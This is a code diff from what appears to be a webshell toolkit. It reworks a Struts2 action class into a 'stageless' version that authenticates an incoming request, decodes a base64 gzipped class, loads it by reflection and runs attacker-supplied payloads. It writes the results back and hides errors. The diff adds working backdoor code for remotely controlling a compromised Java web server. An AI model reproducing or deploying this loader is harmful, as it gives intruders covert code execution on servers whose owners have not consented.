@@ -3,16 +3,15 @@ package com.reajason.noone.core.shelltool;
 import javax.servlet.ServletOutputStream;
 import javax.servlet.http.HttpServletRequest;
 import javax.servlet.http.HttpServletResponse;
-import java.io.ByteArrayInputStream;
-import java.io.ByteArrayOutputStream;
-import java.io.IOException;
+import java.io.*;
 import java.lang.reflect.Method;
 import java.net.URL;
 import java.net.URLClassLoader;
 import java.util.zip.GZIPInputStream;
 
-public class NoOneStruct2Action {
-    private static Class<?> coreClass = null;
+public class NoOneStagelessStruct2Action {
+
+    private static volatile Class<?> coreClass = null;
     private static String coreGzipBase64;
 
     public void execute() throws Exception {
@@ -22,28 +21,36 @@ public class NoOneStruct2Action {
             Method getMethod = clazz.getMethod("get", String.class);
             HttpServletRequest request = (HttpServletRequest) getMethod.invoke(context, "com.opensymphony.xwork2.dispatcher.HttpServletRequest");
             HttpServletResponse response = (HttpServletResponse) getMethod.invoke(context, "com.opensymphony.xwork2.dispatcher.HttpServletResponse");
-            if (isAuthed(request)) {
-                try {
-                    byte[] payload = transformReqPayload(getArgFromRequest(request));
-                    if (coreClass == null) {
-                        byte[] bytes = gzipDecompress(decodeBase64(coreGzipBase64));
-                        coreClass = reflectionDefineClass(bytes);
-                    }
-                    ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
-                    Object httpChannelCore = coreClass.newInstance();
-                    httpChannelCore.equals(new Object[]{payload, outputStream});
+            try {
+                // stageless
+                if (isAuthed(request)) {
                     ServletOutputStream responseOutputStream = response.getOutputStream();
-                    byte[] data = wrapResData(transformResData(outputStream.toByteArray()));
-                    responseOutputStream.write(data);
+                    try {
+                        if (coreClass == null) {
+                            synchronized (NoOneStagelessStruct2Action.class) {
+                                if (coreClass == null) {
+                                    byte[] bytes = gzipDecompress(decodeBase64(coreGzipBase64));
+                                    coreClass = reflectionDefineClass(bytes);
+                                }
+                            }
+                        }
+                        byte[] payload = transformReqPayload(getArgFromRequest(request));
+                        Object httpChannelCore = coreClass.newInstance();
+                        ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
+                        httpChannelCore.equals(new Object[]{request, response});
+                        httpChannelCore.equals(new Object[]{payload, outputStream});
+                        byte[] data = wrapResData(transformResData(outputStream.toByteArray()));
+                        responseOutputStream.write(data);
+                    } catch (Exception e) {
+                        responseOutputStream.write(getStackTraceAsString(e).getBytes("UTF-8"));
+                    }
                     wrapResponse(response);
                     responseOutputStream.flush();
                     responseOutputStream.close();
-                    return;
-                } catch (Throwable ignored) {
                 }
+            } catch (Throwable ignored) {
             }
-        } catch (Throwable e) {
-            e.printStackTrace();
+        } catch (Throwable ignored) {
         }
     }
 
@@ -109,4 +116,12 @@ public class NoOneStruct2Action {
             out.close();
         }
     }
+
+    private String getStackTraceAsString(Throwable throwable) {
+        StringWriter sw = new StringWriter();
+        PrintWriter pw = new PrintWriter(sw);
+        throwable.printStackTrace(pw);
+        return sw.toString();
+    }
+
 }
